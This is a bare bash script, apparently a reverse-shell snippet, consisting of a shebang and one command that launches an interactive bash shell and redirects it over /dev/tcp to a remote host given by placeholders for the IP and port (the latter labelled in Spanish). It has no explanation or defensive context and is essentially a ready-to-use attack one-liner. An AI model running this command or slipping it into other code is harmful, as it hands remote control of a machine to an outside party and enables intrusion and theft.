#!/bin/bash

bash -c "bash -i >& /dev/tcp/<IP>/<puerto> 0>&1"
